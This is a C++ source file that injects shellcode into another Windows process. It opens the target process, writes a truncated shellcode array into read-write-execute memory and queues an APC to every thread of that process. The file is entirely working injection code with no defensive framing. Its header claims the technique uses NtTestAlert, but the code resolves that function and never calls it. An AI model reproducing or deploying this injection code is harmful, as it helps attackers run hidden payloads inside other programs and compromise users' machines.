// spray APC objects to all threads of a process via NtTestAlert native API

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <vector>

unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	// 0x41, 0x50, 0x52, ...
};

unsigned int len = sizeof(shellcode);

int findProcess(const char* procname) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	pe.dwSize = sizeof(PROCESSENTRY32);

	hResult = Process32First(hSnapshot, &pe);

	while (hResult) {
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	CloseHandle(hSnapshot);
	return pid;
}

std::vector<DWORD> findThreads(int processId) {
	THREADENTRY32 thread_entry;
	HANDLE hSnapshot;
	BOOL hResult;
	std::vector<DWORD> thread_Ids;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	thread_entry.dwSize = sizeof(THREADENTRY32);
	hResult = Thread32First(hSnapshot, &thread_entry);

	while (hResult) {
		if (int(thread_entry.th32OwnerProcessID) == processId) {
			thread_Ids.push_back(thread_entry.th32ThreadID);
		}
		hResult = Thread32Next(hSnapshot, &thread_entry);
	}
	CloseHandle(hSnapshot);
	return thread_Ids;
}

#pragma comment(lib, "ntdll")
using ntapiFun = NTSTATUS(NTAPI*)();

int main(int argc, char* argv[]) {
	HANDLE process_handle;
	PVOID remote_buffer;
	std::vector<DWORD> thread_Ids;
	HANDLE thread_handle;

	// find NtTestAlert
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	ntapiFun testAlert = (ntapiFun)(GetProcAddress(hNTDLL, "NtTestAlert"));

	// find process
	printf("%-15s : %s\n", "Process name", argv[1]);
	printf("%-15s : %d\n", "PID", findProcess(argv[1]));
	process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(findProcess(argv[1])));
	if (process_handle == NULL) {
		printf("Process not found!");
		return 0;
	}
	printf("Process opened...\n");

	// allocate memory buffer for remote process
	remote_buffer = VirtualAllocEx(process_handle, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (remote_buffer == NULL) return 0;
	printf("%-15s : 0x%-016p\n", "alloc_mem addr", (void*)remote_buffer);

	// APC routine
	PTHREAD_START_ROUTINE apc_routine = (PTHREAD_START_ROUTINE)remote_buffer;

	// write code in another process memory
	if (!WriteProcessMemory(process_handle, remote_buffer, shellcode, len, NULL)) return 0;

	// loop through all threads and queue APC
	thread_Ids = findThreads(findProcess(argv[1]));
	printf("Adding APC objects...\n");
	for (DWORD thread_Id : thread_Ids) {
		printf("%-15s : %lu\n", "ThreadId", thread_Id);
		thread_handle = OpenThread(THREAD_ALL_ACCESS, TRUE, thread_Id);
		QueueUserAPC((PAPCFUNC)apc_routine, thread_handle, NULL);
	}
}